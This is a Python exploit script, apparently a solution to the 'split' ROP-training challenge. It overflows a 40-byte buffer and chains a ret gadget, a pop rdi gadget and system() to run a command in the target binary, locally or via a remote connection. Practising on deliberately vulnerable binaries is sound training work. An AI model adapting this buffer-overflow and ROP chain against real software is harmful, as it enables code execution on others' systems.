#!/usr/bin/python3
from pwncus import *
from time import sleep

context.log_level = 'debug'
exe = context.binary = ELF('./split', checksec=False)


def GDB(): gdb.attach(p, gdbscript='''

b*pwnme+77
c
''') if not args.REMOTE else None

if args.REMOTE:
    con = sys.argv[1:]
    p = remote(con[0], int(con[1]))
else:
    p = process(argv=[exe.path], aslr=False)
set_p(p)
if args.GDB: GDB(); input()

# ===========================================================
#                          EXPLOIT
# ===========================================================

def exploit():

    pop_rdi = 0x00000000004007c3
    ret = 0x000000000040053e

    pl = b'K' * 0x28 + p64(ret) + p64(pop_rdi) + p64(0x601060) + p64(exe.sym.system)
    sla('>', pl)

    interactive()

if __name__ == '__main__':
    exploit()
